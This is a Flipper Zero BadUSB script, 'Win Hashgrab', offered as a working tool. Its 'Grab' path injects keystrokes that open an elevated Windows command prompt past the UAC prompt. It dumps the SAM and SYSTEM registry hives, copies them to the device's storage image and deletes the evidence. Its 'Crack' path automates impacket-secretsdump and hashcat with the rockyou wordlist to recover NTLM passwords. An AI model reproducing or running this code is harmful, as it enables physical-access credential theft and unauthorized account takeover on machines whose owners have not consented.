// Windows password exfiltration and cracking utility
// By PolyCat

// "Grab" action is a script that exfiltrates hashed Win10 passwords
// "Crack" action is a script ment to be runned in a Kali Linux or Parrort Linux enviroment to try cracking the password

let storage = require("storage");
let usbdisk = require("usbdisk");
let badusb = require("badusb");
let dialog = require("dialog");
let textbox = require("textbox");
let notify = require("notification"); // Remove this if you made Flipper scilent

let image = "/ext/apps_data/mass_storage/win-hashes.img";
let size = 18 * 1024 * 1024;

textbox.setConfig("start", "text");

let mainMenuParams = ({
    header: "Win Hashgrab",
    text: " Welcome to Hashgrab utility",
    button_left: "About",
    button_right: "Crack",
    button_center: "Grab"
});

let mainMenu = dialog.custom(mainMenuParams);

function imageCheck() {
    if (storage.exists(image)) {
        print("Storage Exists.");
    } else {
        print("Creating Storage...");
        usbdisk.createImage(image, size);
    }
}

function imageMount(msg) {
    print("Mounting Image");
    // Storage
    usbdisk.start(image);

    // Ejected check
    textbox.addText(msg)
    while (!usbdisk.wasEjected()) {
        if (!textbox.isOpen()) {
            textbox.show();
        }
        delay(1000);
    }
   
    usbdisk.stop();
    textbox.clearText();
    textbox.close();
}

function startUsbDuck() {
    badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfr_name: "Flipper Devices",
    prod_name: "Flipper Zero",
    layout_path: "/ext/badusb/assets/layouts/en-US.kl",
    });

    print("Waiting for connection");
    while (!badusb.isConnected()) {
        delay(1000);
    }
}

if (mainMenu === "About") {
    dialog.message("Hashgrab - by PolyCat", " Windows Password grabbing and brute forcing script");
    mainMenu = dialog.custom(mainMenuParams);
}

if (mainMenu === "Grab") {
    print("Welcome to Hashgrab");

    // Image setup
    print("Checking for Image...");
    imageCheck();

    // Running payload
    startUsbDuck();

    // START
    print("Running Script");
    badusb.press("GUI", "r");
    delay(500);

    badusb.print("cmd");
    badusb.press("CTRL", "SHIFT", "ENTER");

    delay(1000);
    badusb.press("LEFT");
    delay(300);
    badusb.press("ENTER");

    delay(1000);
    badusb.println("mkdir %USERPROFILE%\save");
    badusb.println("reg save HKLM\sam %USERPROFILE%/save/sam.save");
    badusb.println("reg save HKLM\system %USERPROFILE%/save/system.save");

    // Setup Explorer
    badusb.println("start %windir%\explorer.exe");

    delay(1000);
    badusb.press("CTRL", "l");
    delay(300);
    badusb.println("%USERPROFILE%\save");
    delay(500);

    imageMount("Transfer your files and keep Explorer focused.\nThe script is not over.");

    // Exit
    delay(500);
    badusb.press("ALT", "F4");
    delay(500);
    badusb.println("rmdir /s /q %USERPROFILE%\save");
    badusb.println("exit");


} else if (mainMenu === "Crack") {
    
    startUsbDuck();

    badusb.println("mkdir password-crack && cd password-crack && sudo su");
    dialog.message("Enter your password", "Press OK to continue");
    
    badusb.println("exit");
    delay(300);
    badusb.println("xdg-open . && sudo su");

    imageCheck();
    imageMount("Eject image to continue.\nDon't change focus from file manager.");

    dialog.message("Focus your Terminal", "Press OK to continue");
    badusb.println("apt update && apt install python3-impacket hashcat -y");

    if (dialog.message("Download Rockyou?", "OK = Yes  Back = No")) {
        badusb.println("apt install gzip git -y && git clone https://github.com/PolyCatDev/rockyou.git && mv ./rockyou/rockyou.txt.tar.gz . && rm -rf rockyou && gzip -d rockyou.txt.tar.gz && mv rockyou.txt.tar rockyou.txt");
        
        dialog.message("Download Finished?", "Press OK when done");
    }

    badusb.println("impacket-secretsdump -sam sam.save -system system.save LOCAL");
    delay(500);

    badusb.println("#Save administrator hash to this variable. Press OK on Flipper to continue");
    badusb.print("ADMIN=");

    dialog.message("Admin Hash", "Press ok when done");
    badusb.press("ENTER");

    badusb.println("#Save user hash to this variable. Press OK on Flipper to continue");
    badusb.print("USER=");

    dialog.message("User Hash", "Press ok when done");
    badusb.press("ENTER");

    badusb.println("echo $ADMIN > hashes.txt && echo $USER >> hashes.txt");

    badusb.println("#Save your Word list path to this variable. Press OK on Flipper to continue. EXAMPLE: ./rockyou.txt  OR  ~/password-crack/rockyou.txt");
    badusb.print("WORDLIST=");

    dialog.message("Word list", "Press ok when done");
    badusb.press("ENTER");

    badusb.println("hashcat -m 1000 hashes.txt $WORDLIST");
}

notify.success(); // Remove this to make flipper scilent on finish
